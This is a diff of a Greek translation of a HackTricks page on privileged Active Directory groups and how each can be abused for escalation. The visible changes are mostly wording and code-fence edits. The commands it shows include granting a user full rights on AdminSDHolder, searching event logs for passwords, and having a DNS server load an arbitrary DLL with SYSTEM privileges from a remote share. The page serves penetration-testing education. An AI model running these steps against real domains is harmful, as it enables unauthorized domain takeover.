@@ -1,31 +1,31 @@
-# Προνομιούχες Ομάδες
+# Privileged Groups
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Γνωστές ομάδες με δικαιώματα διαχείρισης
+## Well Known groups with administration privileges
 
-- **Διαχειριστές**
-- **Διαχειριστές Τομέα**
-- **Διαχειριστές Επιχείρησης**
+- **Administrators**
+- **Domain Admins**
+- **Enterprise Admins**
 
-## Λειτουργοί Λογαριασμών
+## Account Operators
 
-Αυτή η ομάδα έχει τη δυνατότητα να δημιουργεί λογαριασμούς και ομάδες που δεν είναι διαχειριστές στον τομέα. Επιπλέον, επιτρέπει τοπική σύνδεση στον Ελεγκτή Τομέα (DC).
+Αυτή η ομάδα έχει την εξουσία να δημιουργεί λογαριασμούς και ομάδες που δεν είναι διαχειριστές στο domain. Επιπλέον, επιτρέπει την τοπική σύνδεση στον Domain Controller (DC).
 
-Για να προσδιοριστούν τα μέλη αυτής της ομάδας, εκτελείται η ακόλουθη εντολή:
-```powershell
+Για να προσδιοριστούν τα μέλη αυτής της ομάδας, εκτελείται η εξής εντολή:
+```bash
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
 Η προσθήκη νέων χρηστών επιτρέπεται, καθώς και η τοπική σύνδεση στο DC01.
 
-## Ομάδα AdminSDHolder
+## AdminSDHolder group
 
 Η Λίστα Ελέγχου Πρόσβασης (ACL) της ομάδας **AdminSDHolder** είναι κρίσιμη καθώς καθορίζει τα δικαιώματα για όλες τις "προστατευμένες ομάδες" εντός του Active Directory, συμπεριλαμβανομένων των ομάδων υψηλών προνομίων. Αυτός ο μηχανισμός διασφαλίζει την ασφάλεια αυτών των ομάδων αποτρέποντας μη εξουσιοδοτημένες τροποποιήσεις.
 
 Ένας επιτιθέμενος θα μπορούσε να εκμεταλλευτεί αυτό τροποποιώντας την ACL της ομάδας **AdminSDHolder**, παρέχοντας πλήρη δικαιώματα σε έναν τυπικό χρήστη. Αυτό θα έδινε ουσιαστικά σε αυτόν τον χρήστη πλήρη έλεγχο σε όλες τις προστατευμένες ομάδες. Εάν τα δικαιώματα αυτού του χρήστη τροποποιηθούν ή αφαιρεθούν, θα αποκατασταθούν αυτόματα εντός μιας ώρας λόγω του σχεδιασμού του συστήματος.
 
 Οι εντολές για την ανασκόπηση των μελών και την τροποποίηση των δικαιωμάτων περιλαμβάνουν:
-```powershell
+```bash
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
@@ -36,7 +36,7 @@ Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityRefer
 
 ## AD Recycle Bin
 
-Η συμμετοχή σε αυτή την ομάδα επιτρέπει την ανάγνωση διαγραμμένων αντικειμένων Active Directory, τα οποία μπορούν να αποκαλύψουν ευαίσθητες πληροφορίες:
+Η συμμετοχή σε αυτή την ομάδα επιτρέπει την ανάγνωση διαγραμμένων αντικειμένων Active Directory, τα οποία μπορεί να αποκαλύψουν ευαίσθητες πληροφορίες:
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
@@ -46,7 +46,7 @@ Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 
 ### Κλιμάκωση Δικαιωμάτων
 
-Χρησιμοποιώντας το `PsService` ή το `sc` από το Sysinternals, μπορεί κανείς να επιθεωρήσει και να τροποποιήσει τις άδειες υπηρεσιών. Η ομάδα `Server Operators`, για παράδειγμα, έχει πλήρη έλεγχο σε ορισμένες υπηρεσίες, επιτρέποντας την εκτέλεση αυθαίρετων εντολών και την κλιμάκωση δικαιωμάτων:
+Χρησιμοποιώντας το `PsService` ή το `sc` από το Sysinternals, μπορεί κανείς να επιθεωρήσει και να τροποποιήσει τις άδειες υπηρεσιών. Η ομάδα `Server Operators`, για παράδειγμα, έχει πλήρη έλεγχο σε ορισμένες υπηρεσίες, επιτρέποντας την εκτέλεση αυθαίρετων εντολών και κλιμάκωση δικαιωμάτων:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
@@ -57,7 +57,7 @@ C:\> .\PsService.exe security AppReadiness
 Η συμμετοχή στην ομάδα `Backup Operators` παρέχει πρόσβαση στο σύστημα αρχείων `DC01` λόγω των δικαιωμάτων `SeBackup` και `SeRestore`. Αυτά τα δικαιώματα επιτρέπουν τη διαδρομή φακέλων, την καταγραφή και τις δυνατότητες αντιγραφής αρχείων, ακόμη και χωρίς ρητές άδειες, χρησιμοποιώντας τη σημαία `FILE_FLAG_BACKUP_SEMANTICS`. Είναι απαραίτητο να χρησιμοποιηθούν συγκεκριμένα σενάρια για αυτή τη διαδικασία.
 
 Για να καταγράψετε τα μέλη της ομάδας, εκτελέστε:
-```powershell
+```bash
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
 ### Τοπική Επίθεση
@@ -133,13 +133,13 @@ echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\
 Τα μέλη της ομάδας **DnsAdmins** μπορούν να εκμεταλλευτούν τα προνόμιά τους για να φορτώσουν μια αυθαίρετη DLL με προνόμια SYSTEM σε έναν διακομιστή DNS, που συχνά φιλοξενείται σε Domain Controllers. Αυτή η δυνατότητα επιτρέπει σημαντική δυνατότητα εκμετάλλευσης.
 
 Για να καταγράψετε τα μέλη της ομάδας DnsAdmins, χρησιμοποιήστε:
-```powershell
+```bash
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
 ### Εκτέλεση αυθαίρετης DLL
 
 Τα μέλη μπορούν να κάνουν τον διακομιστή DNS να φορτώσει μια αυθαίρετη DLL (είτε τοπικά είτε από μια απομακρυσμένη κοινή χρήση) χρησιμοποιώντας εντολές όπως:
-```powershell
+```bash
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
@@ -174,16 +174,16 @@ sc.exe \\dc01 start dns
 Οι DnsAdmins μπορούν να χειριστούν τα DNS records για να εκτελέσουν επιθέσεις Man-in-the-Middle (MitM) δημιουργώντας ένα WPAD record μετά την απενεργοποίηση της παγκόσμιας λίστας αποκλεισμού ερωτημάτων. Εργαλεία όπως το Responder ή το Inveigh μπορούν να χρησιμοποιηθούν για spoofing και καταγραφή δικτυακής κίνησης.
 
 ### Event Log Readers
-Τα μέλη μπορούν να έχουν πρόσβαση στα αρχεία καταγραφής γεγονότων, ενδεχομένως βρίσκοντας ευαίσθητες πληροφορίες όπως κωδικούς πρόσβασης σε απλή μορφή ή λεπτομέρειες εκτέλεσης εντολών:
-```powershell
+Τα μέλη μπορούν να έχουν πρόσβαση σε αρχεία καταγραφής γεγονότων, ενδεχομένως βρίσκοντας ευαίσθητες πληροφορίες όπως κωδικούς πρόσβασης σε απλή μορφή ή λεπτομέρειες εκτέλεσης εντολών:
+```bash
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
 ## Exchange Windows Permissions
 
-Αυτή η ομάδα μπορεί να τροποποιήσει τα DACLs στο αντικείμενο τομέα, πιθανώς παρέχοντας δικαιώματα DCSync. Οι τεχνικές για την κλιμάκωση προνομίων που εκμεταλλεύονται αυτή την ομάδα περιγράφονται στο αποθετήριο Exchange-AD-Privesc στο GitHub.
-```powershell
+Αυτή η ομάδα μπορεί να τροποποιήσει τα DACLs στο αντικείμενο τομέα, πιθανώς παρέχοντας δικαιώματα DCSync. Οι τεχνικές για την κλιμάκωση δικαιωμάτων που εκμεταλλεύονται αυτή την ομάδα περιγράφονται στο Exchange-AD-Privesc GitHub repo.
+```bash
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
@@ -203,16 +203,16 @@ sc.exe start MozillaMaintenance
 
 ## Διαχείριση Οργάνωσης
 
-Σε περιβάλλοντα όπου έχει αναπτυχθεί το **Microsoft Exchange**, μια ειδική ομάδα γνωστή ως **Organization Management** κατέχει σημαντικές δυνατότητες. Αυτή η ομάδα έχει προνόμια να **έχει πρόσβαση στα γραμματοκιβώτια όλων των χρηστών του τομέα** και διατηρεί **πλήρη έλεγχο πάνω στην Οργανωτική Μονάδα 'Microsoft Exchange Security Groups'**. Αυτός ο έλεγχος περιλαμβάνει την ομάδα **`Exchange Windows Permissions`**, η οποία μπορεί να εκμεταλλευτεί για κλιμάκωση προνομίων.
+Σε περιβάλλοντα όπου έχει αναπτυχθεί το **Microsoft Exchange**, μια ειδική ομάδα γνωστή ως **Organization Management** κατέχει σημαντικές δυνατότητες. Αυτή η ομάδα έχει προνόμια να **έχει πρόσβαση στα γραμματοκιβώτια όλων των χρηστών του τομέα** και διατηρεί **πλήρη έλεγχο πάνω στην Οργανωτική Μονάδα (OU) 'Microsoft Exchange Security Groups'**. Αυτός ο έλεγχος περιλαμβάνει την ομάδα **`Exchange Windows Permissions`**, η οποία μπορεί να εκμεταλλευτεί για κλιμάκωση προνομίων.
 
 ### Εκμετάλλευση Προνομίων και Εντολές
 
 #### Εκτυπωτές
 
-Τα μέλη της ομάδας **Print Operators** είναι προικισμένα με αρκετά προνόμια, συμπεριλαμβανομένου του **`SeLoadDriverPrivilege`**, το οποίο τους επιτρέπει να **συνδέονται τοπικά σε έναν Domain Controller**, να τον απενεργοποιούν και να διαχειρίζονται εκτυπωτές. Για να εκμεταλλευτούν αυτά τα προνόμια, ειδικά αν το **`SeLoadDriverPrivilege`** δεν είναι ορατό σε ένα μη ανυψωμένο περιβάλλον, είναι απαραίτητο να παρακαμφθεί ο Έλεγχος Λογαριασμού Χρήστη (UAC).
+Τα μέλη της ομάδας **Print Operators** είναι προικισμένα με αρκετά προνόμια, συμπεριλαμβανομένου του **`SeLoadDriverPrivilege`**, το οποίο τους επιτρέπει να **συνδέονται τοπικά σε έναν Domain Controller**, να τον απενεργοποιούν και να διαχειρίζονται εκτυπωτές. Για να εκμεταλλευτούν αυτά τα προνόμια, ειδικά αν το **`SeLoadDriverPrivilege`** δεν είναι ορατό σε μη ανυψωμένο περιβάλλον, είναι απαραίτητο να παρακαμφθεί ο Έλεγχος Λογαριασμού Χρήστη (UAC).
 
 Για να καταγραφούν τα μέλη αυτής της ομάδας, χρησιμοποιείται η ακόλουθη εντολή PowerShell:
-```powershell
+```bash
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
 Για πιο λεπτομερείς τεχνικές εκμετάλλευσης που σχετίζονται με **`SeLoadDriverPrivilege`**, θα πρέπει να συμβουλευτείτε συγκεκριμένους πόρους ασφαλείας.
@@ -220,7 +220,7 @@ Get-NetGroupMember -Identity "Print Operators" -Recurse
 #### Remote Desktop Users
 
 Τα μέλη αυτής της ομάδας έχουν πρόσβαση σε υπολογιστές μέσω του πρωτοκόλλου Remote Desktop (RDP). Για να καταμετρήσετε αυτά τα μέλη, είναι διαθέσιμες εντολές PowerShell:
-```powershell
+```bash
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
@@ -229,7 +229,7 @@ Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users
 #### Χρήστες Απομακρυσμένης Διαχείρισης
 
 Τα μέλη μπορούν να έχουν πρόσβαση σε υπολογιστές μέσω **Windows Remote Management (WinRM)**. Η καταμέτρηση αυτών των μελών επιτυγχάνεται μέσω:
-```powershell
+```bash
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
@@ -237,8 +237,8 @@ Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Us
 
 #### Διαχειριστές Διακομιστών
 
-Αυτή η ομάδα έχει δικαιώματα να εκτελεί διάφορες ρυθμίσεις στους Ελεγκτές Τομέα, συμπεριλαμβανομένων των δικαιωμάτων δημιουργίας αντιγράφων ασφαλείας και αποκατάστασης, αλλαγής της συστημικής ώρας και απενεργοποίησης του συστήματος. Για να καταμετρήσετε τα μέλη, η εντολή που παρέχεται είναι:
-```powershell
+Αυτή η ομάδα έχει δικαιώματα να εκτελεί διάφορες ρυθμίσεις στους Domain Controllers, συμπεριλαμβανομένων των δικαιωμάτων δημιουργίας αντιγράφων ασφαλείας και αποκατάστασης, αλλαγής της συστημικής ώρας και τερματισμού του συστήματος. Για να καταμετρήσετε τα μέλη, η εντολή που παρέχεται είναι:
+```bash
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
 ## Αναφορές <a href="#references" id="references"></a>
